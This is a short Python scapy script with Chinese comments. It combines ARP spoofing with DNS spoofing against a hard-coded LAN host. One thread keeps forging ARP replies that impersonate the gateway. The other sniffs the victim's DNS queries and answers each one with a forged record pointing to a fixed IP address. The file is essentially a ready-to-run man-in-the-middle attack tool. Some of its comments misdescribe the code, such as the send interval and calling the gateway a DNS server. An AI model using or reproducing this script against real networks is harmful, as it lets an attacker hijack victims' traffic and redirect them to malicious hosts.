from scapy.all import *
import threading

def arpSpoof(target_ip):
    src_mac = "94:E2:3C:36:65:55"  # MAC地址篡改值
    target_getway = "192.168.31.1" # DNS服务器

    # 构造ARP响应数据包
    arp_response = ARP(op=2, pdst=target_ip, psrc = target_getway, hwsrc = src_mac)
    
    while True:
        send(arp_response, verbose=False)
        time.sleep(0.1)  # 每秒发送一次ARP响应

def dnsSpoof():
    # 创建嗅探器，监听网络上的DNS请求
    def dns_callback(packet): # 回调函数，会被sniff()函数调用来处理每个捕获到的数据包
        if DNSQR in packet and packet[DNS].opcode == 0:  # DNS请求
            print("DNS Request:", packet[DNSQR].qname)
            # 构造虚假的DNS响应数据包，实际需要填充的数据是下面填充数据的子集，具体什么是必要的本人未作研究
            dns_response = IP(dst=packet[IP].src,src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                           DNS(id=packet[DNS].id, qr=1, ra=1,ancount=1,qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, type='A',rclass = 'IN',ttl=1000, rdata='20.205.243.166'))
            dns_response.FCfield = 2 # 构造 DNS 控制标志字段，表示一个 DNS 响应

            # 发送虚假的DNS响应
            print("DNS Respose:", dns_response[DNSQR].qname)
            send(dns_response)

    # 启动嗅探器
    sniff(prn=dns_callback, filter="udp and port 53 and src host 192.168.31.76", store=0) # Remember to set.



def dnsDeceive():
    target_ip = "192.168.31.76"  # 替换为目标主机的IP地址

    # 启动ARP欺骗线程
    arp_thread = threading.Thread(target=arpSpoof, args=(target_ip,))
    arp_thread.start()

    # 启动DNS欺骗线程
    dns_thread = threading.Thread(target=dnsSpoof)
    dns_thread.start()

    arp_thread.join()  # 等待ARP欺骗线程终止（永远不会终止）
    dns_thread.join()  # 等待DNS欺骗线程终止（永远不会终止）

dnsDeceive()